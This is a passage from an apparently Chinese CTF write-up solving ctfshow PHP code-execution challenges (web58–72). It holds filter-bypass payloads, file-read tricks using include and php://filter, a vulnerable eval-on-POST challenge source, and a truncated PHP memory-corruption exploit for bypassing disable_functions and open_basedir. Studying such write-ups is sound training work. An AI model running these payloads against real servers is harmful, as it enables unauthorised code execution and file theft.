class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web58-66"><a href="#web58-66" class="headerlink" title="web58-66"></a>web58-66</h2><p>我们输入system之类的会被过滤，所以应为disable_functions的绕过。</p><p>所以，我们直接使用Web31的方式。此外还有多种方式，读取文件。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"flag1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">//过59将其变为了数组。</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">?</span><span class="token number">1</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read/convert.base64-encode/resource=flag.txt</span>c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 输出已经被定义的变量</span>也可以使用curl模拟get<span class="token operator">/</span>pot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>翻来覆去的就这些。换着用得了。</p><h2 id="web66-70"><a href="#web66-70" class="headerlink" title="web66-70"></a>web66-70</h2><p>老套路，获得后，提示没有在flag.php中，所以我们可以var_dump(scandir(/));查找，发现再根目录。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">hightlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 因为是txt文件，包含后直接显示</span>c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">rror_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 获得缓冲区内容</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// 清空缓冲区内容</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>首先找到路径</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">opendir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$file</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flagx.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获得路径后，使用之后的脚本，并将其url编码。这里主要是绕过basedir</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>             <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                